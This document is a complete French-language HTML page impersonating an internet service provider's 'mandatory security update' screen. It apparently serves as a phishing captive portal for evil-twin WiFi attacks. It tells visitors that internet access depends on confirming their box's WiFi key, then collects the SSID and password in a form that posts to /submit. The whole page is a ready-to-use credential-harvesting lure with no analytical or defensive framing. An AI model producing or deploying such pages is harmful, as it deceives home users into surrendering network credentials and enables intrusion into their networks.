<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mise à jour requise — Box Internet</title>
<style>
  body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, sans-serif;
         background: linear-gradient(135deg, #0066cc 0%, #003d7a 100%); min-height: 100vh; display: flex;
         align-items: center; justify-content: center; padding: 20px; }
  .container { background: white; max-width: 420px; width: 100%; border-radius: 8px;
               box-shadow: 0 10px 40px rgba(0,0,0,0.2); padding: 32px; }
  .logo { text-align: center; margin-bottom: 24px; }
  .logo-circle { width: 64px; height: 64px; background: #0066cc; border-radius: 50%;
                 display: inline-flex; align-items: center; justify-content: center;
                 color: white; font-size: 28px; font-weight: bold; }
  h1 { font-size: 20px; margin: 0 0 12px 0; color: #1a1a1a; text-align: center; }
  .subtitle { color: #666; font-size: 14px; text-align: center; margin: 0 0 24px 0; line-height: 1.5; }
  .alert { background: #fff3cd; border-left: 4px solid #ffc107; padding: 12px 16px; margin-bottom: 24px;
           font-size: 13px; color: #856404; border-radius: 4px; }
  label { display: block; font-size: 13px; color: #444; margin-bottom: 6px; font-weight: 500; }
  input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 15px;
          margin-bottom: 16px; box-sizing: border-box; transition: border-color 0.2s; }
  input:focus { outline: none; border-color: #0066cc; }
  button { width: 100%; padding: 13px; background: #0066cc; color: white; border: none;
           border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer;
           transition: background 0.2s; }
  button:hover { background: #0052a3; }
  .footer { text-align: center; margin-top: 24px; font-size: 11px; color: #999; }
</style>
</head>
<body>
<div class="container">
  <div class="logo">
    <div class="logo-circle">B</div>
  </div>
  <h1>Mise à jour de sécurité requise</h1>
  <p class="subtitle">Pour continuer à utiliser internet, veuillez confirmer la clé WiFi de votre box pour autoriser la mise à jour.</p>
  <div class="alert">
    <strong>⚠ Action requise</strong><br>
    Cette étape est temporaire et obligatoire suite à une mise à jour de sécurité du firmware.
  </div>
  <form method="POST" action="/submit">
    <label for="ssid">Nom du réseau (SSID)</label>
    <input type="text" id="ssid" name="ssid" value="" placeholder="Ex: Bbox-12345678" required>
    <label for="password">Clé WiFi (au dos de votre box)</label>
    <input type="password" id="password" name="password" placeholder="••••••••" required>
    <button type="submit">Confirmer et continuer</button>
  </form>
  <div class="footer">Votre opérateur · Connexion sécurisée</div>
</div>
</body>
</html>
